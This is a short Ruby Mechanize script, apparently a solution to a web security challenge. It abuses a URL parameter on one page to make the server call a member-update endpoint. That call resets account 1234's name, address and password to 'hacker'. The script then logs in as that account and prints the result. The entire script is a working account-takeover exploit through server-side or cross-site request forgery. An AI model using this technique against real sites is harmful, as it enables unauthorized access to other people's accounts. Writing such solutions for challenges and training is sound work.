#!/usr/bin/ruby
require 'mechanize'
require 'cgi'
mech=Mechanize.new
mech.post('http://whitecafe.moe.hm/take54_sub/index.php',{'url'=>'http://whitecafe.moe.hm/take54_sub/member_update.php?name_sei=黒田&name_mei=発火&name_kana_sei=ブラック&name_kana_mei=ハッカー&zip01=812&zip02=0011&pref=福岡県&addr=福岡市博多区博多駅前3-12-21&password=hacker&submit=hacker'}) #this submit=hacker is crap.
mech.post('http://whitecafe.moe.hm/take54_sub/login.php',{'id'=>'1234','password'=>'hacker'})
puts mech.page.body